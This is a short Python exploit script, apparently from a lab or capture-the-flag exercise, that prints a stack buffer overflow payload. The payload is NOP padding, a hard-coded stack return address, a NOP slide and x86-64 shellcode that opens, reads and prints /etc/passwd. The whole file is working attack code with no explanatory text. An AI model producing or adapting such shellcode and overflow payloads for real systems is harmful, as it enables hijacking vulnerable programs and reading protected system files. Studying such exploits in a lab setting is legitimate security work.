#!/usr/bin/python

import sys

shellcode1 = "\x48\x31\xc0\x04\x02\x48\x8d\x3d\x29\x11\x11\x01\x48\x81\xef\xc5\x10\x11\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05\x50\x41\x58\x48\x83\xec\x78\x48\x31\xc0\x04\x04\x48\x8d\x3d\x29\x11\x11\x01\x48\x81\xef\xe7\x10\x11\x01\x54\x5e\x0f\x05\x48\x83\xc4\x30\x41\x59\x48\x83\xc4\x44\x4c\x29\xcc\x41\x50\x5f\x48\x31\xc0\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
exp = '\x90'*(280)
nopslide = "\x90" * 19
# Should have code execution here: return to the shellcode.
myretaddr = "\x18\xd5\xff\xff\xff\x7f"

sys.stdout.write(exp + myretaddr + "\x00\x00" + nopslide + shellcode1)
